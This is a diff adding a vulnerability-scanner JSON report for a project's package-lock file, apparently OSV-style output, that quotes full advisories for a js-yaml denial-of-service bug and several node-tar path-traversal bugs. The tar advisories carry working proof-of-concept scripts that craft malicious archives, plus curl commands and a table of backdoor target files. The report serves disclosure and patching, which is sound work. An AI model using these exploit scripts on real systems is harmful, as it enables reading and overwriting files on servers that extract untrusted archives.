@@ -1,0 +1,1037 @@
+{
+  "results": [
+    {
+      "source": {
+        "path": "/home/flegartech/Downloads/drivewise-main/package-lock.json",
+        "type": "lockfile"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "js-yaml",
+            "version": "3.14.2",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2026-06-16T16:44:28Z",
+              "published": "2026-06-15T17:15:07Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-h67p-54hq-rp68",
+              "aliases": [
+                "CVE-2026-53550"
+              ],
+              "related": [
+                "CGA-hxp5-835r-fjv4"
+              ],
+              "summary": "JS-YAML: Quadratic-complexity DoS in merge key handling via repeated aliases",
+              "details": "### Summary\nA crafted YAML document can trigger algorithmic CPU exhaustion in `js-yaml` merge-key processing (`\u003c\u003c`) by repeating the same alias many times in a merge sequence.  \nThis causes quadratic parse-time behavior relative to input size and can block a Node.js worker/event loop for seconds with a relatively small payload (tens of KB), resulting in denial of service.\n\n### Details\nThe issue is in merge handling inside `lib/loader.js`:\n\n- `storeMappingPair(...)` iterates every element of a merge sequence when key tag is `tag:yaml.org,2002:merge`.\n- For each element, it calls `mergeMappings(...)`.\n- `mergeMappings(...)` computes `Object.keys(source)` and performs `_hasOwnProperty.call(destination, key)` checks for each key.\n\nWhen input is of the form:\n\na: \u0026a {k0:0, k1:0, ..., kK:0}\nb: {\u003c\u003c: [*a, *a, *a, ... repeated M times ...]}\nall *a entries refer to the same anchored object. After the first merge, subsequent merges are semantically no-ops, but the parser still reprocesses all keys each time.\nResulting work is O(K * M), while input size is O(K + M), giving quadratic scaling as payload grows.\nRelevant code path:\nlib/loader.js in storeMappingPair(...) merge branch (keyTag === 'tag:yaml.org,2002:merge')\nlib/loader.js mergeMappings(...)\n\n\n### Root cause\nFile:       lib/loader.js\nFunction:   storeMappingPair(state, _result, overridableKeys, keyTag, keyNode,\n                             valueNode, startLine, startLineStart, startPos)\nLines:      ~359-366\n\n    if (keyTag === 'tag:yaml.org,2002:merge') {\n      if (Array.isArray(valueNode)) {\n        for (index = 0, quantity = valueNode.length; index \u003c quantity; index += 1) {\n          mergeMappings(state, _result, valueNode[index], overridableKeys);\n        }\n      } else {\n        mergeMappings(state, _result, valueNode, overridableKeys);\n      }\n    }\n\nWhen the merge value is a sequence (YAML 1.1 \u003c\u003c: [ *a, *a, ... ]), each element\nis handed to mergeMappings() without deduplication. mergeMappings() then does\n\n    sourceKeys = Object.keys(source);\n    for (index = 0; index \u003c sourceKeys.length; index += 1) {\n      key = sourceKeys[index];\n      if (!_hasOwnProperty.call(destination, key)) {\n        setProperty(destination, key, source[key]);\n        overridableKeys[key] = true;\n      }\n    }\n\nEvery alias reference in the sequence resolves (by design) to the SAME object\nvia state.anchorMap. After the first merge, every subsequent merge of that same\nreference is a pure no-op semantically, but still performs:\n\n  * one Object.keys(source) call (O(K))\n  * K _hasOwnProperty.call checks on the destination\n\nTotal: M * K hasOwnProperty checks + M Object.keys allocations, while the final\nobject and all observable side effects are identical to a single merge.\n\nYAML semantics for `\u003c\u003c:` are idempotent and commutative over duplicate sources,\nso collapsing duplicates preserves behavior exactly; this isn't a spec trade-off.\n\n\n### PoC\nEnvironment:\njs-yaml version: 4.1.1\nNode.js: v24.5.0\nPlatform: arm64 macOS (reproduced consistently)\nReproduction script:\nCreate many keys in one anchored map (\u0026a).\nMerge that same alias repeatedly via \u003c\u003c: [*a, *a, ...].\nMeasure parse time and compare with control payload using single merge (\u003c\u003c: *a).\nObserved repeated runs (same machine):\nK=M=1000, input 9,909 bytes: ~33–36 ms\nK=M=2000, input 20,909 bytes: ~121–123 ms\nK=M=4000, input 42,909 bytes: ~524–537 ms\nK=M=6000, input 64,909 bytes: ~1,608–1,829 ms\nK=M=8000, input 86,909 bytes: ~3,395–3,565 ms\nControl (single merge, similar key counts):\nK=2000: ~1–2 ms\nK=4000: ~3 ms\nK=8000: ~5 ms\nAlso verified: repeated-merge output equals single-merge output (same key count and same JSON), confirming excess time is redundant computation.\n\n\n### Impact\nThis is a denial-of-service vulnerability (CPU exhaustion / algorithmic complexity).\nAny service parsing untrusted YAML with js-yaml can be impacted, including API backends, CI tools, config processors, and automation services. An attacker can submit crafted YAML to significantly increase CPU time and reduce availability.\n\n### Suggested fix:\nDedupe the merge source list by reference before invoking mergeMappings. Any of\nthe following are minimal and preserve YAML 1.1 merge semantics:\n\ndedupe in storeMappingPair:\n\n    if (keyTag === 'tag:yaml.org,2002:merge') {\n      if (Array.isArray(valueNode)) {\n        var seen = new Set();\n        for (index = 0, quantity = valueNode.length; index \u003c quantity; index += 1) {\n          var src = valueNode[index];\n          if (seen.has(src)) continue;   // idempotent; skip redundant alias\n          seen.add(src);\n          mergeMappings(state, _result, src, overridableKeys);\n        }\n      } else {\n        mergeMappings(state, _result, valueNode, overridableKeys);\n      }\n    }",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "js-yaml",
+                    "purl": "pkg:npm/js-yaml"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.2.0"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 4.1.1",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-h67p-54hq-rp68/GHSA-h67p-54hq-rp68.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nodeca/js-yaml/security/advisories/GHSA-h67p-54hq-rp68"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/nodeca/js-yaml"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-407"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-06-15T17:15:07Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-h67p-54hq-rp68"
+              ],
+              "aliases": [
+                "CVE-2026-53550",
+                "GHSA-h67p-54hq-rp68"
+              ],
+              "max_severity": "5.3"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "tar",
+            "version": "6.2.1",
+            "ecosystem": "npm"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2026-02-04T03:15:55Z",
+              "published": "2026-01-28T16:35:31Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-34x7-hfp2-rc4v",
+              "aliases": [
+                "CVE-2026-24842"
+              ],
+              "related": [
+                "CGA-53g6-x8ch-qg5h"
+              ],
+              "summary": "node-tar Vulnerable to Arbitrary File Creation/Overwrite via Hardlink Path Traversal",
+              "details": "### Summary\nnode-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.\n\n### Details\nThe vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:\n\n**Security check in `[STRIPABSOLUTEPATH]`:**\n```javascript\nconst entryDir = path.posix.dirname(entry.path);\nconst resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));\nif (resolved.startsWith('../')) { /* block */ }\n```\n\n**Hardlink creation in `[HARDLINK]`:**\n```javascript\nconst linkpath = path.resolve(this.cwd, entry.linkpath);\nfs.linkSync(linkpath, dest);\n```\n\n**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.\n\n- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.\n\n- **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.\n\nThe security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.\n\n### PoC\n#### Setup\n\nCreate a new directory with these files:\n\n```\npoc/\n├── package.json\n├── secret.txt          ← sensitive file (target)\n├── server.js           ← vulnerable server\n├── create-malicious-tar.js\n├── verify.js\n└── uploads/            ← created automatically by server.js\n    └── (extracted files go here)\n```\n\n**package.json**\n```json\n{ \"dependencies\": { \"tar\": \"^7.5.0\" } }\n```\n\n**secret.txt** (sensitive file outside uploads/)\n```\nDATABASE_PASSWORD=supersecret123\n```\n\n**server.js** (vulnerable file upload server)\n```javascript\nconst http = require('http');\nconst fs = require('fs');\nconst path = require('path');\nconst tar = require('tar');\n\nconst PORT = 3000;\nconst UPLOAD_DIR = path.join(__dirname, 'uploads');\nfs.mkdirSync(UPLOAD_DIR, { recursive: true });\n\nhttp.createServer((req, res) =\u003e {\n  if (req.method === 'POST' \u0026\u0026 req.url === '/upload') {\n    const chunks = [];\n    req.on('data', c =\u003e chunks.push(c));\n    req.on('end', async () =\u003e {\n      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));\n      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });\n      res.end('Extracted\\n');\n    });\n  } else if (req.method === 'GET' \u0026\u0026 req.url === '/read') {\n    // Simulates app serving extracted files (e.g., file download, static assets)\n    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n    if (fs.existsSync(targetPath)) {\n      res.end(fs.readFileSync(targetPath));\n    } else {\n      res.end('File not found\\n');\n    }\n  } else if (req.method === 'POST' \u0026\u0026 req.url === '/write') {\n    // Simulates app writing to extracted file (e.g., config update, log append)\n    const chunks = [];\n    req.on('data', c =\u003e chunks.push(c));\n    req.on('end', () =\u003e {\n      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n      if (fs.existsSync(targetPath)) {\n        fs.writeFileSync(targetPath, Buffer.concat(chunks));\n        res.end('Written\\n');\n      } else {\n        res.end('File not found\\n');\n      }\n    });\n  } else {\n    res.end('POST /upload, GET /read, or POST /write\\n');\n  }\n}).listen(PORT, () =\u003e console.log(`http://localhost:${PORT}`));\n```\n\n**create-malicious-tar.js** (attacker creates exploit TAR)\n```javascript\nconst fs = require('fs');\n\nfunction tarHeader(name, type, linkpath = '', size = 0) {\n  const b = Buffer.alloc(512, 0);\n  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);\n  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);\n  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);\n  b.write('        ', 148);\n  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;\n  if (linkpath) b.write(linkpath, 157);\n  b.write('ustar\\x00', 257); b.write('00', 263);\n  let sum = 0; for (let i = 0; i \u003c 512; i++) sum += b[i];\n  b.write(sum.toString(8).padStart(6, '0') + '\\x00 ', 148);\n  return b;\n}\n\n// Hardlink escapes to parent directory's secret.txt\nfs.writeFileSync('malicious.tar', Buffer.concat([\n  tarHeader('d/', 'dir'),\n  tarHeader('d/x', 'link', '../secret.txt'),\n  Buffer.alloc(1024)\n]));\nconsole.log('Created malicious.tar');\n```\n\n#### Run\n\n```bash\n# Setup\nnpm install\necho \"DATABASE_PASSWORD=supersecret123\" \u003e secret.txt\n\n# Terminal 1: Start server\nnode server.js\n\n# Terminal 2: Execute attack\nnode create-malicious-tar.js\ncurl -X POST --data-binary @malicious.tar http://localhost:3000/upload\n\n# READ ATTACK: Steal secret.txt content via the hardlink\ncurl http://localhost:3000/read\n# Returns: DATABASE_PASSWORD=supersecret123\n\n# WRITE ATTACK: Overwrite secret.txt through the hardlink\ncurl -X POST -d \"PWNED\" http://localhost:3000/write\n\n# Confirm secret.txt was modified\ncat secret.txt\n```\n### Impact\n\nAn attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:\n\n**Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process.\n\n**Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.\n\n### Remote Code Execution / Server Takeover\n\n| Attack Vector | Target File | Result |\n|--------------|-------------|--------|\n| SSH Access | `~/.ssh/authorized_keys` | Direct shell access to server |\n| Cron Backdoor | `/etc/cron.d/*`, `~/.crontab` | Persistent code execution |\n| Shell RC Files | `~/.bashrc`, `~/.profile` | Code execution on user login |\n| Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests |\n| Systemd Services | `/etc/systemd/system/*.service` | Code execution on service restart |\n| User Creation | `/etc/passwd` (if running as root) | Add new privileged user |\n\n## Data Exfiltration \u0026 Corruption\n\n1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations\n2. **Read sensitive files** by creating hardlinks that point outside extraction directory\n3. **Corrupt databases** and application state\n4. **Steal credentials** from config files, `.env`, secrets",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar",
+                    "purl": "pkg:npm/tar"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "7.5.7"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-34x7-hfp2-rc4v/GHSA-34x7-hfp2-rc4v.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-tar/security/advisories/GHSA-34x7-hfp2-rc4v"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-24842"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-tar/commit/f4a7aa9bc3d717c987fdf1480ff7a64e87ffdb46"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/isaacs/node-tar"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22",
+                  "CWE-59"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-01-28T16:35:31Z",
+                "nvd_published_at": "2026-01-28T01:16:14Z",
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2026-02-20T17:04:10Z",
+              "published": "2026-02-18T00:57:13Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-83g3-92jg-28cx",
+              "aliases": [
+                "CVE-2026-26960"
+              ],
+              "related": [
+                "CGA-x5w5-w4hp-jcv9"
+              ],
+              "summary": "Arbitrary File Read/Write via Hardlink Target Escape Through Symlink Chain in node-tar Extraction",
+              "details": "### Summary\n`tar.extract()` in Node `tar` allows an attacker-controlled archive to create a hardlink inside the extraction directory that points to a file outside the extraction root, using default options.\n\nThis enables **arbitrary file read and write** as the extracting user (no root, no chmod, no `preservePaths`).\n\nSeverity is high because the primitive bypasses path protections and turns archive extraction into a direct filesystem access primitive.\n\n### Details\nThe bypass chain uses two symlinks plus one hardlink:\n\n1. `a/b/c/up -\u003e ../..`\n2. `a/b/escape -\u003e c/up/../..`\n3. `exfil` (hardlink) -\u003e `a/b/escape/\u003ctarget-relative-to-parent-of-extract\u003e`\n\nWhy this works:\n\n- Linkpath checks are string-based and do not resolve symlinks on disk for hardlink target safety.\n  - See `STRIPABSOLUTEPATH` logic in:\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:255`\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:268`\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:281`\n\n- Hardlink extraction resolves target as `path.resolve(cwd, entry.linkpath)` and then calls `fs.link(target, destination)`.\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:566`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:567`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:703`\n\n- Parent directory safety checks (`mkdir` + symlink detection) are applied to the destination path of the extracted entry, not to the resolved hardlink target path.\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:617`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:619`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:27`\n  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:101`\n\nAs a result, `exfil` is created inside extraction root but linked to an external file. The PoC confirms shared inode and successful read+write via `exfil`.\n\n### PoC\n[hardlink.js](https://github.com/user-attachments/files/25240082/hardlink.js)\nEnvironment used for validation:\n\n- Node: `v25.4.0`\n- tar: `7.5.7`\n- OS: macOS Darwin 25.2.0\n- Extract options: defaults (`tar.extract({ file, cwd })`)\n\nSteps:\n\n1. Prepare/locate a `tar` module. If `require('tar')` is not available locally, set `TAR_MODULE` to an absolute path to a tar package directory.\n\n2. Run:\n\n```bash\nTAR_MODULE=\"$(cd '../tar-audit-setuid - CVE/node_modules/tar' \u0026\u0026 pwd)\" node hardlink.js\n```\n\n3. Expected vulnerable output (key lines):\n\n```text\nsame_inode=true\nread_ok=true\nwrite_ok=true\nresult=VULNERABLE\n```\n\nInterpretation:\n\n- `same_inode=true`: extracted `exfil` and external secret are the same file object.\n- `read_ok=true`: reading `exfil` leaks external content.\n- `write_ok=true`: writing `exfil` modifies external file.\n\n### Impact\nVulnerability type:\n\n- Arbitrary file read/write via archive extraction path confusion and link resolution.\n\nWho is impacted:\n\n- Any application/service that extracts attacker-controlled tar archives with Node `tar` defaults.\n- Impact scope is the privileges of the extracting process user.\n\nPotential outcomes:\n\n- Read sensitive files reachable by the process user.\n- Overwrite writable files outside extraction root.\n- Escalate impact depending on deployment context (keys, configs, scripts, app data).",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar",
+                    "purl": "pkg:npm/tar"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "7.5.8"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-83g3-92jg-28cx/GHSA-83g3-92jg-28cx.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-tar/security/advisories/GHSA-83g3-92jg-28cx"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-26960"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-tar/commit/2cb1120bcefe28d7ecc719b41441ade59c52e384"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-tar/commit/d18e4e1f846f4ddddc153b0f536a19c050e7499f"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/isaacs/node-tar"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-02-18T00:57:13Z",
+                "nvd_published_at": "2026-02-20T02:16:53Z",
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2026-02-22T23:20:34Z",
+              "published": "2026-01-16T21:16:20Z",
+              "schema_version": "1.7.3",
+              "id": "GHSA-8qq5-rm4j-mr97",
+              "aliases": [
+                "CVE-2026-23745"
+              ],
+              "related": [
+                "CGA-52cj-4vg5-vcmc"
+              ],
+              "summary": "node-tar is Vulnerable to Arbitrary File Overwrite and Symlink Poisoning via Insufficient Path Sanitization",
+              "details": "### Summary\n\nThe `node-tar` library (`\u003c= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup \u0026 Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1. Craft malicious Link header (Hardlink to absolute local file)\nconst h1 = new tar.Header({\n  path: 'exploit_hard',\n  type: 'Link',\n  size: 0,\n  linkpath: secret \n})\nh1.encode()\n\n// 2. Craft malicious Symlink header (Symlink to /etc/passwd)\nconst h2 = new tar.Header({\n  path: 'exploit_sym',\n  type: 'SymbolicLink',\n  size: 0,\n  linkpath: targetSym \n})\nh2.encode()\n\n// Write binary tar\nfs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))\n\nconsole.log('[*] Extracting malicious tarball...')\n\n// 3. Extract with default secure settings\ntar.x({\n  cwd: out,\n  file: tarFile,\n  preservePaths: false\n}).then(() =\u003e {\n  console.log('[*] Verifying payload...')\n\n  // Test Hardlink Overwrite\n  try {\n    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')\n    \n    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {\n      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')\n    } else {\n      console.log('[-] Hardlink failed')\n    }\n  } catch (e) {}\n\n  // Test Symlink Poisoning\n  try {\n    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {\n      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')\n    } else {\n      console.log('[-] Symlink failed')\n    }\n  } catch (e) {}\n})\n\n```\n\n### Impact\n\n* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.\n* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar",
+                    "purl": "pkg:npm/tar"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "7.5.3"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 7.5.2",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-8qq5-rm4j-mr97/GHSA-8qq5-rm4j-mr97.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-tar/security/advisories/GHSA-8qq5-rm4j-mr97"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-23745"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-tar/commit/340eb285b6d986e91969a1170d7fe9b0face405e"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/isaacs/node-tar"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-01-16T21:16:20Z",
+                "nvd_published_at": "2026-01-16T22:16:26Z",
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2026-03-13T04:44:43Z",
+              "published": "2026-03-10T23:44:58Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-9ppj-qmqm-q256",
+              "aliases": [
+                "CVE-2026-31802"
+              ],
+              "related": [
+                "CGA-w37q-mf7c-963v"
+              ],
+              "summary": "node-tar Symlink Path Traversal via Drive-Relative Linkpath",
+              "details": "### Summary\n`tar` (npm) can be tricked into creating a symlink that points outside the extraction directory by using a drive-relative symlink target such as `C:../../../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.\n\n### Details\nThe extraction logic in `Unpack[STRIPABSOLUTEPATH]` validates `..` segments against a resolved path that still uses the original drive-relative value, and only afterwards rewrites the stored `linkpath` to the stripped value.\n\nWhat happens with `linkpath: \"C:../../../target.txt\"`:\n1. `stripAbsolutePath()` removes `C:` and rewrites the value to `../../../target.txt`.\n2. The escape check resolves using the original pre-stripped value, so it is treated as in-bounds and accepted.\n3. Symlink creation uses the rewritten value (`../../../target.txt`) from nested path `a/b/l`.\n4. Writing through the extracted symlink overwrites the outside file (`../target.txt`).\n\nThis is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.\n\n### PoC\nTested on Arch Linux with `tar@7.5.10`.\n\nPoC script (`poc.cjs`):\n\n```js\nconst fs = require('fs')\nconst path = require('path')\nconst { Header, x } = require('tar')\n\nconst cwd = process.cwd()\nconst target = path.resolve(cwd, '..', 'target.txt')\nconst tarFile = path.join(cwd, 'poc.tar')\n\nfs.writeFileSync(target, 'ORIGINAL\\n')\n\nconst b = Buffer.alloc(1536)\nnew Header({\n  path: 'a/b/l',\n  type: 'SymbolicLink',\n  linkpath: 'C:../../../target.txt',\n}).encode(b, 0)\nfs.writeFileSync(tarFile, b)\n\nx({ cwd, file: tarFile }).then(() =\u003e {\n  fs.writeFileSync(path.join(cwd, 'a/b/l'), 'PWNED\\n')\n  process.stdout.write(fs.readFileSync(target, 'utf8'))\n})\n```\n\nRun:\n\n```bash\nnode poc.cjs \u0026\u0026 readlink a/b/l \u0026\u0026 ls -l a/b/l ../target.txt\n```\n\nObserved output:\n\n```text\nPWNED\n../../../target.txt\nlrwxrwxrwx - joshuavr  7 Mar 18:37 󰡯 a/b/l -\u003e ../../../target.txt\n.rw-r--r-- 6 joshuavr  7 Mar 18:37  ../target.txt\n```\n\n`PWNED` confirms outside file content overwrite. `readlink` and `ls -l` confirm the extracted symlink points outside the extraction directory.\n\n### Impact\nThis is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.\n\nRealistic scenarios:\n- CLI tools unpacking untrusted tarballs into a working directory\n- build/update pipelines consuming third-party archives\n- services that import user-supplied tar files",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar",
+                    "purl": "pkg:npm/tar"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "7.5.11"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 7.5.10",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-9ppj-qmqm-q256/GHSA-9ppj-qmqm-q256.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-tar/security/advisories/GHSA-9ppj-qmqm-q256"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-31802"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-tar/commit/f48b5fa3b7985ddab96dc0f2125a4ffc9911b6ad"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/isaacs/node-tar"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22"
+                ],
